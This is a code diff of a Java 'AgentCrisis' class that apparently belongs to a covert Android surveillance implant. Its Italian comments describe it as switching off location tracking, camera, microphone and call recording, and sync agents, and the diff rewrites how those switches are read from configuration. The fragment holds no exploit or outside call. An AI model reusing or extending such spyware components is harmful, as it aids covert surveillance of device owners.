@@ -14,6 +14,7 @@ import java.io.IOException;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.Evidence;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -25,13 +26,14 @@ public class AgentCrisis extends AgentBase {
 	public static final int POSITION = 0x1; // Inibisci il GPS/GSM/WiFi Location
 											// Agent
 	public static final int CAMERA = 0x2; // Inibisci il Camera Agent
-	public static final int MIC = 0x4; // Inibisci la registrazione del
+	public static final int MIC = 0x3; // Inibisci la registrazione del
 										// microfono
-	public static final int CALL = 0x8; // Inibisci l'agente di registrazione
+	public static final int CALL = 0x4; // Inibisci l'agente di registrazione
 										// delle chiamate
-	public static final int SYNC = 0x10; // Inibisci tutte le routine di
+	public static final int SYNC = 0x5; // Inibisci tutte le routine di
 											// sincronizzazione
-	public static final int ALL = 0xffffffff; // Per retrocompatibilita'
+	public static final int SIZE = 0x6;
+
 
 	private int type;
 
@@ -48,32 +50,23 @@ public class AgentCrisis extends AgentBase {
 	}
 
 	@Override
-	public boolean parse(AgentConf conf) {
-		final byte[] confParameters = conf.getParams();
-		if (confParameters.length == 0) {
-			// backward compatibility
-			Status.self().setCrisis(0xffffffff);
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "old configuration: " + type) ;//$NON-NLS-1$ //$NON-NLS-2$
-			}
-
-			return true;
+	public boolean parse(AgentConf conf) throws ConfigurationException {
+		Status status = Status.self();
+		if(conf.getBoolean("synchronize")){
+			status.setCrisis(SYNC, true);
 		}
-
-		final DataBuffer databuffer = new DataBuffer(confParameters, 0, confParameters.length);
-
-		try {
-			type = databuffer.readInt();
-		} catch (final IOException e) {
-			return false;
+		if(conf.getBoolean("call")){
+			status.setCrisis(CALL, true);
 		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: " + "type: " + type) ;//$NON-NLS-1$ //$NON-NLS-2$
+		if(conf.getBoolean("mic")){
+			status.setCrisis(MIC, true);
 		}
-
-		Status.self().setCrisis(type);
+		if(conf.getBoolean("camera")){
+			status.setCrisis(CAMERA, true);
+		}
+		if(conf.getBoolean("position")){
+			status.setCrisis(POSITION, true);
+		}
 
 		return true;
 	}
